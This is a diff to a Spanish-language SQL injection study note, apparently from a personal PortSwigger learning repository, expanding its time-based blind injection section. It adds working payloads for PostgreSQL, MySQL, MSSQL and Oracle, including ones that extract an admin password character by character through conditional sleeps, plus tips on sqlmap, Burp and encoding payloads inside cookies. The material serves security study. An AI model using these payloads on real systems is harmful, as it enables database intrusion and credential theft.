@@ -45,9 +45,46 @@ Cuando la aplicación solo cambia su respuesta (ej. "Bienvenido" vs "Login falli
 - **Inferencia**: `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--`
 
 ### 3. Inyección Ciega Basada en Tiempo (Time-blind)
-Cuando la respuesta es idéntica, se induce un retraso en la base de datos.
-- **MySQL**: `?id=1' AND IF(1=1, SLEEP(5), 0)--`
-- **PostgreSQL**: `?id=1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`
+Cuando ni los errores ni la respuesta booleana se reflejan, el único canal observable es el **tiempo de respuesta**. Se fuerza a la DB a dormir N segundos y se compara contra un baseline previo (mandar 3-4 requests limpias antes de inyectar para conocer el tiempo "rápido" — sin baseline no se distingue un retardo provocado de la latencia normal).
+
+**Primitivos de retardo por motor**:
+
+| Motor | Función / Sentencia | Notas |
+|---|---|---|
+| **PostgreSQL** | `SELECT pg_sleep(N)` | Bloqueante, sin permisos especiales |
+| **MySQL / MariaDB** | `SELECT SLEEP(N)` | Igual que PostgreSQL |
+| **MS SQL Server** | `WAITFOR DELAY '0:0:N'` | No es función — sentencia. No vale dentro de un `SELECT` |
+| **Oracle** | `dbms_pipe.receive_message(('a'),N)` | Recibe en pipe inexistente y timeoutea a los N segundos. No hay `SLEEP` puro |
+| **SQLite** | (sin función nativa) | Se simula con queries pesadas, ej. `randomblob(100000000)` o CTE recursiva |
+
+**Tres formas de inyectar el sleep** (mismo motor, distinto vector según qué tolere el sink):
+
+```sql
+-- 1) Stacked queries (driver permite multi-statement). Sólo provoca el retardo, no extrae nada.
+'; SELECT pg_sleep(10)--
+
+-- 2) Concatenación (PostgreSQL/Oracle/SQLite). Útil con límite de longitud.
+'||pg_sleep(10)--
+
+-- 3) Cláusula AND (más universal). Funciona aunque stacked queries esté deshabilitado.
+' AND pg_sleep(10)--
+```
+
+**Inferencia bit a bit** — para extraer datos por tiempo, hay que condicionar el sleep al valor leído. `CASE WHEN <condición> THEN sleep ELSE 0 END`:
+
+- **PostgreSQL**: `'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin'--`
+- **MySQL**: `' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)--`
+- **MS SQL**: `'; IF (SELECT TOP 1 SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '0:0:5'--`
+
+Iterar carácter a carácter (preferiblemente con búsqueda binaria sobre el rango ASCII para reducir requests). Automatizable con `sqlmap --technique=T` o Burp Intruder con grep-time.
+
+**⚠️ Gotcha — `;` en headers Cookie**: si el sink es una cookie, `;` es el delimitador de cookies en la cabecera. Un payload con `;` literal corta la cookie ahí y el resto nunca llega al backend. Hay que URL-encodearlo como `%3B` dentro del valor:
+
+```
+Cookie: TrackingId=x'%3BSELECT+pg_sleep(10)--
+```
+
+Burp Repeater no encodea automáticamente — escribirlo ya como `%3B`. Mismo cuidado con `,` en algunos parsers de cookies. En parámetros GET/POST normales el `;` no es delimitador y va literal.
 
 ### 4. Lectura de Archivos Locales (load_file)
 Si el usuario de la DB tiene permisos de lectura y la variable `secure_file_priv` es nula:
@@ -64,3 +101,4 @@ Si el usuario de la DB tiene permisos de lectura y la variable `secure_file_priv
 - OWASP Foundation. (2021). *SQL Injection Prevention Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
 - PortSwigger Web Security Academy. (s.f.). *Blind SQL injection*. https://portswigger.net/web-security/sql-injection/blind
 - Writeup propio: [`learning/portswigger/visible-error-based-sql-injection/writeup.md`](../../../learning/portswigger/visible-error-based-sql-injection/writeup.md) — ejemplo end-to-end del primitivo `CAST` en PostgreSQL leyendo `users.password` desde una cookie de tracking, incluyendo workaround con `||` ante límite de longitud.
+- Writeup propio: [`learning/portswigger/blind-sqli-time-delays/writeup.md`](../../../learning/portswigger/blind-sqli-time-delays/writeup.md) — ejemplo end-to-end de time-based con `pg_sleep` vía stacked queries en cookie, incluyendo el detalle de URL-encodear el `;` como `%3B`.
